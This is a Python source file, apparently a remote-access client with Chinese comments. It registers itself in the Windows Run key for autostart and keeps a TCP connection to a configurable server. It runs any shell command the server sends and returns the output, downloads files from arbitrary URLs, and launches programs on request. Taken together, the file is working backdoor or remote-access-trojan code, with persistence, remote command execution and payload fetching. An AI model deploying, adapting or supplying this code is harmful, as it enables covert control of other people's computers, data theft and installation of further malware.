import socket
import time
import sys
import threading
import subprocess
import os
import random
import json
import logging
import subprocess
from datetime import datetime
import requests
import winreg
import re

def download_file(url, filename=None):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
        "Cookie": "__test=ffa305912029c869f9773fb4d23809a4"
    }
    response = requests.get(url, headers=headers)
    if not filename:
        content_disposition = response.headers.get('Content-Disposition')
        if content_disposition:
            fname = re.findall("filename=\"(.+)\"   ", content_disposition)
            if fname: filename = fname[0].strip('"\'')
    if not filename: filename = os.path.basename(url)
    if not filename: filename = "downloaded_file"
    with open(filename, 'wb') as f:
        f.write(response.content)

class DailyFileHandler(logging.FileHandler):
    def __init__(self, mode='a', encoding='utf-8'):
        # 获取当前日期
        current_date = datetime.now().strftime('%Y-%m-%d')
        # 按日期创建文件名
        dated_filename = os.path.join("logs", f"{current_date}.log")
        super().__init__(dated_filename, mode, encoding)

def setup_daily_logging():
    # 创建logs目录
    log_dir = "logs"
    if not os.path.exists(log_dir):
        os.makedirs(log_dir)
    
    # 配置logger
    logger = logging.getLogger("DailyLogger")
    logger.setLevel(logging.DEBUG)
    
    handler = DailyFileHandler()
    
    # 设置格式
    formatter = logging.Formatter(
        '%(asctime)s - %(levelname)s - %(message)s',
        datefmt='%Y-%m-%d %H:%M:%S'
    )
    handler.setFormatter(formatter)
    
    logger.addHandler(handler)
    
    return logger

logger = setup_daily_logging()


def get_base_path():
    """Get base path of the program"""
    if getattr(sys, 'frozen', False):
        # If the program is frozen, use the executable path
        return os.path.dirname(sys.executable)
    else:
        # If the program is not frozen, use the script path
        return os.path.dirname(os.path.abspath(__file__))

def generate_identifier():
    """Generate a random 16-character hex identifier"""
    return ''.join(random.choice('0123456789ABCDEF') for _ in range(16))

def get_or_create_identifier():
    """Get existing identifier or create new one"""
    identifier_file = os.path.join(get_base_path(), 'identifier.json')
    try:
        with open(identifier_file, 'r') as f:
            data = json.load(f)
            return data['identifier']
    except (FileNotFoundError, json.JSONDecodeError, KeyError):
        identifier = generate_identifier()
        with open(identifier_file, 'w') as f:
            json.dump({'identifier': identifier}, f)
        return identifier

def setup_autostart():
    """Add program to Windows startup"""
    try:
        # Skip if not on Windows
        if not sys.platform.startswith('win'):
            return False
                
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r'Software\Microsoft\Windows\CurrentVersion\Run',
            0, winreg.KEY_SET_VALUE)
            
        # Handle both frozen and non-frozen cases
        if getattr(sys, 'frozen', False):
            exe_path = sys.executable
        else:
            exe_path = os.path.abspath(sys.argv[0])
        winreg.SetValueEx(key, 'ControlerClient', 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(key)
        return True
    except Exception as e:
        logger.error(f"Failed to set up autostart: {e}")
        return False

def receive_messages(sock):
    while True:
        try:
            sock.settimeout(60)
            data = sock.recv(65536)
            if not data:
                logger.error("Server disconnected")
                break
            # Handle regular messages
            try:
                message = data.decode('utf-8')
                if message == "HEARTBEAT":
                    sock.send("HEARTBEAT_RESPONSE".encode("utf-8"))
                elif message.startswith("cmd "):
                    # Execute command
                    command = message[4:]
                    logger.info(f"Execute command: {command}")
                    try:
                        result = subprocess.getoutput(command)
                        sock.send(f"CMDRES:{result}".encode('utf-8'))
                    except Exception as e:
                        sock.send(f"CMDERR:{str(e)}".encode('utf-8'))
                elif message.startswith("wget "):
                    info = message[5:].split()
                    if len(info) == 0:
                        logging.error(f"Wrong wget command: {message[5:]}")
                        continue
                    url = info[0]
                    file_name = None
                    if len(info) >= 2:
                        file_name = info[1]

                    logger.info(f"Downloading file at {url}")
                    try:
                        download_file(url, file_name)
                        logger.info(f"Download {url} successfully")
                    except Exception as e:
                        logger.error(f"While download {url}, {str(e)}")

                elif message.startswith("open "):
                    try:
                        path = message[5:]
                        subprocess.Popen(
                            path.split(),
                            close_fds=True
                        )
                    except Exception as e:
                        logger.error(f"Open program error {str(e)}")
                elif message != "HEARTBEAT_RESPONSE":
                    logger.info(f"Received: {message}")
            except UnicodeDecodeError:
                logger.info(f"Received binary data: {data}")

        except socket.timeout:
            # Send heart beat check
            try:
                sock.send("HEARTBEAT".encode('utf-8'))
            except:
                break
        except ConnectionResetError:
            logger.error("Connection lost with server (Connection reset error)")
            break
        except Exception as e:
            logger.error(f"Client error: {str(e)}")
            break


def start_client(debug=True):
    # Setup autostart on first run
    if debug:
        host = '127.0.0.1'
        port = 30003
    else:
        setup_autostart()
        host = 'your.server.ip'
        port = 30003

    # Get or create client identifier
    client_id = get_or_create_identifier()
    logger.info(f"Client identifier: {client_id}")
    
    reconnect_delay = 5  # 初始重连延迟
    max_reconnect_delay = 60  # 最大重连延迟
    
    while True:
        try:
            # 创建TCP socket
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.settimeout(10)  # 连接超时
            client_socket.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            
            # 尝试连接服务器
            client_socket.connect((host, port))
            
            # Send client identifier first
            client_socket.send(f"IDENTIFIER:{client_id}".encode('utf-8'))
            
            logger.info("Connected to server successfully")
            reconnect_delay = 5  # 重置重连延迟
            
            # 启动接收线程
            receiver = threading.Thread(
                target=receive_messages,
                args=(client_socket,),
                daemon=True
            )
            receiver.start()
            
            try:
                while receiver.is_alive():
                    time.sleep(1)  # 主线程保持运行
                    
            except (ConnectionResetError, BrokenPipeError):
                logger.error("Connection lost while sending")
            finally:
                client_socket.close()
                logger.error(f"Connection closed, reconnecting in {reconnect_delay} seconds...")
                time.sleep(reconnect_delay)
                reconnect_delay = min(reconnect_delay * 2, max_reconnect_delay)  # 指数退避
                
        except ConnectionRefusedError:
            try:
                time.sleep(5)
            except KeyboardInterrupt:
                os._exit(0)
        except socket.timeout:
            try:
                time.sleep(5)
            except KeyboardInterrupt:
                os._exit(0)
        except KeyboardInterrupt:
             os._exit(0)
        except Exception as e:
            logger.error(f"Unexpected error: {str(e)}")
            try:
                time.sleep(10)
            except KeyboardInterrupt:
                os._exit(0)

if __name__ == "__main__":
    start_client(True)
